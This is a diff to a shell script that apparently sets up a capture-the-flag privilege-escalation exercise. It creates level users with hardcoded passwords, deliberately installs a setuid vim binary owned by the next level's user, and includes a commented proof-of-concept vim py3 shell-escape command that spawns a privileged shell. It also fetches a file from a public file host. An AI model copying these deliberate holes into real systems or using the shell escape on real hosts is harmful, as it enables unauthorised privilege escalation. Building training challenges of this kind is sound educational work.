@@ -96,40 +96,43 @@ level7() {
 
 level8() {
     groupadd -g 8888 level8
-    groupadd -g 9999 level9
     useradd -m -s /bin/bash -u 8888 -g 8888 level8
-    useradd -m -s /bin/bash -u 9999 -g 9999 level9
     echo 'level8:d1ff3rEnc3s' | chpasswd
 
-    apt install -y vim
-    cp $(which vim) /home/level8/vim
+    # make this level the 'totally-real-program.exe' level (use `find` to discover the file type)
+    # (thinking about it now though, they won't have a way to view the QR code, so gonna have to use a different file)
+    # make next level the grep challenge - out.txt too big for github so just recreate file in the script
+    chmod -R ug=rx /home/level8
 
-    chown level9:level9 /home/level8/vim
-    
-    chmod -R ugo=rx /home/level8
-    chmod ug=rx /home/level8 
-    
-    chmod u+s /home/level8/vim
+}
+level9() {
+    groupadd -g 9999 level 9
+    useradd -m -s /bin/bash -u 9999 -g 9999 level9
+    echo 'level9:3xtend0' | chpasswd 
 
-    # PoC: ./vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+    curl -o /home/level9/out.txt https://file.io/zO2L6xJoXqSj
+
+    chmod -R ug=rx /home/level8
 }
 
-level9() {
-    # User level9 was created in level 8
-    groupadd -g 1010 level10
-    useradd -s /bin/bash -m -u 1010 -g 1010 level10
-    
-    echo 'c0nqu3r3d' > /home/level10/final_flag.txt
-    echo "ping -c 5 localhost" > /home/level10/cronjob.sh
+level10() {
+    groupadd -g 1110 level11
+    groupadd -g 1100 level10
+    useradd -m -s /bin/bash -u 1110 -g 1110 level11
+    useradd -m -s /bin/bash -u 1100 -g 1100 level10
+    echo 'level11:' | chpasswd
 
-    apt install -y cron
-    echo "* * * * * level10 /bin/bash /home/level10/cronjob.sh" >> /etc/crontab
+    apt install -y vim
+    cp $(which vim) /home/level10/vim
+
+    chown level11:level11 /home/level10/vim
     
-    chmod -R ugo=r /home/level10
-    chmod ugo=rx /home/level10
-    chmod o-rwx /home/level10/final_flag.txt
-    chmod o=rwx /home/level10/cronjob.sh
-    chown -R level10:level10 /home/level10
+    chmod -R ugo=rx /home/level10
+    chmod ug=rx /home/level10 
+    
+    chmod u+s /home/level10/vim
+
+    # PoC: ./vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
 }
 
 
